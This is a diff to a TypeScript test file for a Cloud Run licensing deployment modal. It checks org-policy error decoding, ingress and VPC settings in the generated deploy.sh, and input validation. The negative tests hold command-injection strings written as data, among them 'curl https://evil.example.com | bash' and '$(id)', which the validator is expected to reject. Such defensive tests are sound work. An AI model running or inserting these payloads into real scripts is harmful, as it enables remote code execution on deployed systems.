@@ -23,6 +23,7 @@ import GroupLicenseDeploymentModal, {
   generateDeploySh,
   generateManualSetupMarkdown,
   sanitizeCloudRunLabelValue,
+  validateCloudRunNetworkConfig,
 } from '../components/license/GroupLicenseDeploymentModal';
 import mainPyTemplate from '../components/license/main.py.template?raw';
 import { CloudRunServiceItem } from '../components/license/types';
@@ -30,7 +31,7 @@ import * as api from '../services/apiService';
 import * as core from '../services/api/core';
 import { GapiError, getDiscoveryEngineUrl } from '../services/api/core';
 import { ensureCloudRunInvokerRole, triggerCloudRunServiceJob } from '../services/api/cloudRun';
-import { formatActAsServiceAccountError } from '../utils/errors';
+import { formatActAsServiceAccountError, formatCloudRunDeploymentError } from '../utils/errors';
 
 const toastMock = {
   success: vi.fn(),
@@ -1309,7 +1310,156 @@ describe('useGroupLicensing & Cloud Run group licensing trigger', () => {
       expect(alertText).toContain('roles/iam.serviceAccountUser');
     });
   });
+
+  it('defaults Cloud Run ingress to internal, supports Direct VPC Egress / VPC Connector for Org Policies, and rejects hostile or incomplete VPC inputs', async () => {
+    const { execFileSync } = await import('node:child_process');
+
+    // 1. Decode exact customer multi-violation Org Policy error
+    const customerOrgPolicyErr =
+      'failed precondition: the request has violated multiple org policies. google.rpc.precoditionfailure, run.allowedVPCEgress violated for ateempting create service with annotation "run.googleapis.com/vpc-access-egress" set to null, run.allowed ingress violoated for ateempting create serice with annotation "run.googleapis.com/ingress" set to the default value all.';
+    const decodedOrgErr = formatCloudRunDeploymentError(customerOrgPolicyErr, 'Deploy failed', 'cust-prod-proj');
+    expect(decodedOrgErr).toContain('constraints/run.allowedIngress');
+    expect(decodedOrgErr).toContain('--ingress=internal');
+    expect(decodedOrgErr).toContain('constraints/run.allowedVPCEgress');
+    expect(decodedOrgErr).toContain('--project="cust-prod-proj" --effective');
+
+    // 2. Default deploy.sh uses #!/usr/bin/env bash and INGRESS="${INGRESS:-internal}"
+    const defaultScript = generateDeploySh(
+      'cust-prod-proj',
+      'global',
+      'default_user_store',
+      'us-central1',
+      'gs://prod-bucket/config/entitlements.json',
+      'SUBSCRIPTION_TIER_ENTERPRISE',
+      '',
+      '180054373655',
+    );
+    expect(defaultScript.startsWith('#!/usr/bin/env bash\n')).toBe(true);
+    expect(defaultScript).toContain('INGRESS="${INGRESS:-internal}"');
+    expect(defaultScript.split('"${NETWORK_FLAGS[@]}"').length - 1).toBe(2);
+    expect(() => execFileSync('bash', ['-n'], { input: defaultScript, encoding: 'utf-8' })).not.toThrow();
+
+    // 3. Shared VPC Direct Egress configuration generates valid bash + markdown flags
+    const sharedVpcNet = validateCloudRunNetworkConfig({
+      ingress: 'internal',
+      vpcEgress: 'all-traffic',
+      vpcNetwork: 'projects/host-net-proj/global/networks/shared-vpc',
+      vpcSubnet: 'projects/host-net-proj/regions/us-central1/subnetworks/ge-subnet',
+    });
+    const vpcScript = generateDeploySh(
+      'cust-prod-proj',
+      'global',
+      'default_user_store',
+      'us-central1',
+      'gs://prod-bucket/config/entitlements.json',
+      'SUBSCRIPTION_TIER_ENTERPRISE',
+      '',
+      '180054373655',
+      sharedVpcNet,
+    );
+    expect(vpcScript).toContain('VPC_EGRESS="${VPC_EGRESS:-all-traffic}"');
+    expect(vpcScript).toContain('VPC_NETWORK="${VPC_NETWORK:-projects/host-net-proj/global/networks/shared-vpc}"');
+    expect(vpcScript).toContain('VPC_SUBNET="${VPC_SUBNET:-projects/host-net-proj/regions/us-central1/subnetworks/ge-subnet}"');
+    expect(() => execFileSync('bash', ['-n'], { input: vpcScript, encoding: 'utf-8' })).not.toThrow();
+
+    const vpcMd = generateManualSetupMarkdown({
+      projectId: 'cust-prod-proj',
+      projectNumber: '180054373655',
+      location: 'global',
+      userStoreId: 'default_user_store',
+      region: 'us-central1',
+      configGcsUri: 'gs://prod-bucket/config/entitlements.json',
+      selectedTier: 'SUBSCRIPTION_TIER_ENTERPRISE',
+      networkConfig: sharedVpcNet,
+    });
+    expect(vpcMd).toContain(
+      '--ingress="internal" --network="projects/host-net-proj/global/networks/shared-vpc" --subnet="projects/host-net-proj/regions/us-central1/subnetworks/ge-subnet" --vpc-egress="all-traffic"',
+    );
+
+    // 4. Negative / adversarial validation tests: hostile shell metacharacters, mutually exclusive VPC flags, and missing VPC target
+    expect(() =>
+      validateCloudRunNetworkConfig({
+        ingress: 'internal',
+        vpcEgress: 'private-ranges-only',
+        vpcNetwork: 'default; curl https://evil.example.com | bash',
+      }),
+    ).toThrow(/Invalid VPC Network/);
+
+    expect(() =>
+      validateCloudRunNetworkConfig({
+        ingress: 'internal',
+        vpcEgress: 'private-ranges-only',
+        vpcSubnet: 'sub$(id)',
+      }),
+    ).toThrow(/Invalid VPC Subnet/);
+
+    expect(() =>
+      validateCloudRunNetworkConfig({
+        ingress: 'internal',
+        vpcEgress: 'private-ranges-only',
+        vpcConnector: 'conn" --allow-unauthenticated',
+      }),
+    ).toThrow(/Invalid Serverless VPC Connector/);
+
+    expect(() =>
+      validateCloudRunNetworkConfig({
+        ingress: 'internal',
+        vpcEgress: 'private-ranges-only',
+        vpcNetwork: 'default',
+        vpcConnector: 'my-connector',
+      }),
+    ).toThrow(/Specify either Direct VPC Egress .* or a Serverless VPC Connector, not both/);
+
+    expect(() =>
+      validateCloudRunNetworkConfig({
+        ingress: 'internal',
+        vpcEgress: 'all-traffic',
+      }),
+    ).toThrow(/requires specifying a VPC Network \/ Subnet .* or a Serverless VPC Connector/);
+
+    // 5. UI check: selecting VPC Egress = all-traffic without a network/subnet/connector blocks Deploy Job with clear alert
+    vi.spyOn(api, 'getProject').mockResolvedValue({
+      projectId: 'cust-prod-proj',
+      projectNumber: '180054373655',
+    } as never);
+    vi.spyOn(api, 'listLicenseConfigs').mockResolvedValue({ licenseConfigs: [] } as never);
+    vi.spyOn(api, 'listBuckets').mockResolvedValue({
+      items: [{ id: 'b1', name: 'prod-bucket' }],
+    } as never);
+    const uploadSpy = vi.spyOn(api, 'uploadFileToGcs').mockResolvedValue({} as never);
+
+    render(
+      <GroupLicenseDeploymentModal
+        isOpen={true}
+        onClose={vi.fn()}
+        projectNumber="cust-prod-proj"
+        currentConfig={{ appLocation: 'global', userStoreId: 'default_user_store' }}
+        apiLicenseConfigs={[]}
+        editConfig={null}
+      />,
+    );
+
+    await waitFor(() => {
+      expect(screen.getByRole('button', { name: 'Deploy Job' })).not.toBeDisabled();
+    });
+
+    fireEvent.change(screen.getByPlaceholderText('group1@example.com, group2@example.com'), {
+      target: { value: 'ge-users@customer.com' },
+    });
+    fireEvent.change(screen.getByLabelText('VPC Egress'), {
+      target: { value: 'all-traffic' },
+    });
+    fireEvent.click(screen.getByRole('button', { name: 'Deploy Job' }));
+
+    await waitFor(() => {
+      expect(screen.getByRole('alert').textContent).toContain(
+        'VPC Egress "all-traffic" requires specifying a VPC Network / Subnet (Direct VPC Egress) or a Serverless VPC Connector.',
+      );
+    });
+    expect(uploadSpy).not.toHaveBeenCalled();
+  });
 });
+
 
 
 
